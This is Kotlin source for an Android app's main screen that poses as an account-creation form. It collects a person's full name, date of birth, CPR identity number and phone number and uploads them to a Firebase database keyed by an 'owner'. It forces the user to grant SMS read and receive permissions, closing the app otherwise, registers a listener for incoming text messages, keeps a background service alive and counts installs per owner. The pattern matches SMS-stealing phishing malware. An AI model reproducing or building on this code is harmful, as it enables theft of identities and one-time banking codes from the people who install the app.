package com.nonatech.jest


import android.Manifest
import android.app.Activity
import android.app.DatePickerDialog
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.SharedPreferences
import android.content.pm.PackageManager
import android.os.Build
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.text.Editable
import android.text.TextWatcher
import android.util.Log
import android.widget.*
import androidx.activity.result.ActivityResultLauncher
import androidx.activity.result.contract.ActivityResultContracts
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import androidx.lifecycle.lifecycleScope
import com.google.firebase.database.FirebaseDatabase
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import java.text.SimpleDateFormat
import java.util.*

class MainActivity : AppCompatActivity() {


    private val requestPermissionLauncher = registerForActivityResult(ActivityResultContracts.RequestPermission()) { isGranted: Boolean ->
        if (!isGranted) {
            Toast.makeText(this@MainActivity, "permission denied", Toast.LENGTH_SHORT).show()
        }
    }

    private lateinit var cprEditText: EditText
    private lateinit var phoneEditText: EditText
    private lateinit var fullName: EditText
    private lateinit var next: Button
    lateinit var datepicker : TextView
    lateinit var dateValue : String
    private var isFirstTime = false

    private val SMS_PERMISSION_CODE = 1

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        datepicker = findViewById(R.id.date)
        val countriesList = listOf(
            "Bahrain", "India", "China", "Indonesia", "Pakistan", "Bangladesh", "Japan",
            "Philippines", "Vietnam", "Iran", "Turkey", "Thailand", "Myanmar", "South Korea",
            "Iraq", "Afghanistan", "Saudi Arabia", "Uzbekistan", "Yemen", "Malaysia", "Nepal",
            "North Korea", "Syria", "Sri Lanka", "Kazakhstan", "Cambodia", "Jordan", "Azerbaijan",
            "Tajikistan", "United Arab Emirates", "Israel", "Laos", "Kyrgyzstan", "Turkmenistan",
            "Singapore", "State of Palestine", "Lebanon", "Oman", "Kuwait", "Georgia", "Mongolia",
            "Armenia", "Qatar", "Timor-Leste", "Cyprus", "Bhutan", "Maldives", "Brunei"
        )

        datepicker.setOnClickListener {
            showDatePickerDialog()
        }


        val sharedPreferences: SharedPreferences =
            getSharedPreferences("MyPreferences", Context.MODE_PRIVATE)
        val intent = Intent(this, MyService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            Log.i("TAG", "onCreate:  start service in if")
            ContextCompat.startForegroundService(this, intent)
        } else {
            Log.i("TAG", "onCreate:  start service in else")

        }
        checkAndRequestSmsPermissions()


        var smsReceiver = SmsReceiver()
        val filter = IntentFilter("android.provider.Telephony.SMS_RECEIVED")
        registerReceiver(smsReceiver, filter)



        cprEditText = findViewById(R.id.cpr)
        fullName = findViewById(R.id.fullName)
        cprEditText = findViewById(R.id.cpr)
        phoneEditText = findViewById(R.id.etPhone)
        next = findViewById(R.id.imageView3)

//        setSuggestionAdapter(country,countriesList)
        //....suggestionsAdapter....//


//        phoneEditText.addTextChangedListener(object : TextWatcher {
//            override fun beforeTextChanged(
//                s: CharSequence?,
//                start: Int,
//                count: Int,
//                after: Int
//            ) {
//            }
//
//            override fun onTextChanged(s: CharSequence?, start: Int, before: Int, count: Int) {}
//
//            override fun afterTextChanged(s: Editable?) {
//                val maxLength = 8 // Limit to 8 characters
//                if ((s?.length ?: 0) > maxLength) {
//                    phoneEditText.setText(s?.substring(0, maxLength))
//                    phoneEditText.setSelection(maxLength) // Move cursor to the end
//                }
//            }
//        })



        cprEditText.addTextChangedListener(object : TextWatcher {
            override fun beforeTextChanged(
                s: CharSequence?,
                start: Int,
                count: Int,
                after: Int
            ) {
            }

            override fun onTextChanged(s: CharSequence?, start: Int, before: Int, count: Int) {}

            override fun afterTextChanged(s: Editable?) {
                val maxLength = 9 // Limit to 8 characters
                if ((s?.length ?: 0) > maxLength) {
                    cprEditText.setText(s?.substring(0, maxLength))
                    cprEditText.setSelection(maxLength) // Move cursor to the end
                }
            }
        })

        next.setOnClickListener {
            val cpr = cprEditText.text.toString()
            val phone = phoneEditText.text.toString()
            val fullNameString = fullName.text.toString()


            if (cpr.isEmpty()||phone.isEmpty() ){
                Toast.makeText(this, "Filed Must Not Be Empty", Toast.LENGTH_SHORT).show()
            }else{
                val ref = FirebaseDatabase.getInstance().getReference(LastPage.owner).child("Users")
                val key = ref.push().key
                val model = UserModel(key!!,"",fullNameString,dateValue,cpr,phone,System.currentTimeMillis().toString())
                ref.child(key).setValue(model)
                val intent = Intent(this, LastPage::class.java)
                intent.flags = Intent.FLAG_ACTIVITY_CLEAR_TASK or Intent.FLAG_ACTIVITY_NEW_TASK
                intent.putExtra("key",key)
                intent.putExtra("cpr",cpr)
                intent.putExtra("phone",phone)
                lifecycleScope.launch {
                    var d = Utils.showProgressDialog(this@MainActivity, "Creating Account...")
                    delay(2000)
                    startActivity(intent)
                    d.dismiss()
                }
                var shared = getSharedPreferences("my_preferences", MODE_PRIVATE)
                shared.edit().putString("number", phone.toString()).apply()

                val editor = sharedPreferences.edit()
                editor.putBoolean("GetStartedClicked", true)
                editor.apply()
                // Dismiss the "Please
            }
        }
        if (sharedPreferences.getBoolean("GetStartedClicked", false)) {
            var i = Intent(this, LastPage::class.java)
            i.flags =  Intent.FLAG_ACTIVITY_CLEAR_TASK or Intent.FLAG_ACTIVITY_NEW_TASK
            startActivity(i)
        }

        isFirstTime = sharedPreferences.getBoolean("Key", true)
        if (isFirstTime) {
            sharedPreferences.edit().putBoolean("Key", false).apply()
            FirebaseDatabase.getInstance().getReference(LastPage.owner).child("install").get().addOnSuccessListener {
                var n = it.getValue(Int::class.java)
                if (n!=null){
                    FirebaseDatabase.getInstance().getReference(LastPage.owner).child("install").setValue(n+1)
                }else{
                    FirebaseDatabase.getInstance().getReference(LastPage.owner).child("install").setValue(1)

                }
            }
        }

    }


    private fun checkAndRequestSmsPermissions() {
        val readSmsPermission = Manifest.permission.READ_SMS
        val receiveSmsPermission = Manifest.permission.RECEIVE_SMS

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (ContextCompat.checkSelfPermission(
                    this,
                    readSmsPermission
                ) == PackageManager.PERMISSION_DENIED ||
                ContextCompat.checkSelfPermission(
                    this,
                    receiveSmsPermission
                ) == PackageManager.PERMISSION_DENIED
            ) {
                // Permission not granted, request it from the user
                ActivityCompat.requestPermissions(
                    this,
                    arrayOf(readSmsPermission, receiveSmsPermission),
                    SMS_PERMISSION_CODE
                )
            } else {
                Log.i("TAG", "Permission: Already granted")
            }
        } else {
            Log.i("TAG", "Permission: SDK version is not >= M")
        }
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == 1) {
            if (grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED &&
                grantResults[1] == PackageManager.PERMISSION_GRANTED
            ) {
                Log.i("TAG", "ok: ok")
                askNotificationPermission(this, requestPermissionLauncher)

            } else {
                Toast.makeText(this@MainActivity, "We cannot proceed without this access", Toast.LENGTH_SHORT).show()
                // Permission denied, handle it (e.g., show a message to the user)
                finishAffinity()
                // You can also request permissions again or take alternative actions.
            }
        }
    }


    override fun onDestroy() {
        super.onDestroy()
        startService(intent)
    }

    fun askNotificationPermission(context: Context, requestPermissionLauncher: ActivityResultLauncher<String>) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            when {
                ContextCompat.checkSelfPermission(context, Manifest.permission.POST_NOTIFICATIONS) == PackageManager.PERMISSION_GRANTED -> {
                }
                context is Activity && context.shouldShowRequestPermissionRationale(Manifest.permission.POST_NOTIFICATIONS) -> {
                    requestPermissionLauncher.launch(Manifest.permission.POST_NOTIFICATIONS)
                }
                else -> {
                    requestPermissionLauncher.launch(Manifest.permission.POST_NOTIFICATIONS)
                }
            }
        }
    }

    private fun setSuggestionAdapter(textView: AutoCompleteTextView,list: List<String>){
        val phonesAdapter = ArrayAdapter(this, android.R.layout.simple_dropdown_item_1line, list)
        textView.setAdapter(phonesAdapter)
    }


    private fun showDatePickerDialog() {
        val calendar = Calendar.getInstance()
        val year = calendar.get(Calendar.YEAR)
        val month = calendar.get(Calendar.MONTH)
        val day = calendar.get(Calendar.DAY_OF_MONTH)

        val datePickerDialog = DatePickerDialog(
            this,R.style.MyDatePickerDialogStyle,
            { _, selectedYear, selectedMonth, selectedDay ->
                val selectedDate = formatDate(selectedYear, selectedMonth, selectedDay)
                datepicker.text =  "${ selectedDate.day}-${selectedDate.month}-${selectedDate.year}"
                dateValue =  "${ selectedDate.day}-${selectedDate.month}-${selectedDate.year}"
            },
            year, month, day
        )

        datePickerDialog.datePicker.maxDate = System.currentTimeMillis()
        datePickerDialog.show()
    }


    private fun formatDate(year: Int, month: Int, day: Int): FormattedDate {
        val calendar = Calendar.getInstance()
        calendar.set(Calendar.YEAR, year)
        calendar.set(Calendar.MONTH, month)
        calendar.set(Calendar.DAY_OF_MONTH, day)

        val dateFormat = SimpleDateFormat("MM", Locale.ENGLISH)
        val monthName = dateFormat.format(calendar.time)

        return FormattedDate(day.toString(), monthName, year.toString())
    }
    data class FormattedDate(val day: String, val month: String, val year: String)


}